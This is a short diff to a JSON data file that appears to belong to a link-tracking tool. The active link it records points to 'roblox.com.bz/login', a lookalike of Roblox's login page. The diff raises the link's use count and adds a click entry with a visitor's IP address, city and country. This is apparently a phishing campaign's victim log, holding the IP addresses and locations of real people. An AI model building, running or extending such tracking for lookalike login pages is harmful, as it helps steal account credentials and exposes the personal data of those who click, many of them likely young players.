@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 5,
+    "useCount": 6,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14203,6 +14203,14 @@
         "city": "Beirut",
         "flag": "🇱🇧",
         "countryCode": "LB"
+      },
+      {
+        "timestamp": 1778691948370,
+        "ip": "101.47.6.172",
+        "country": "Singapore",
+        "city": "Singapore",
+        "flag": "🇸🇬",
+        "countryCode": "SG"
       }
     ]
   }
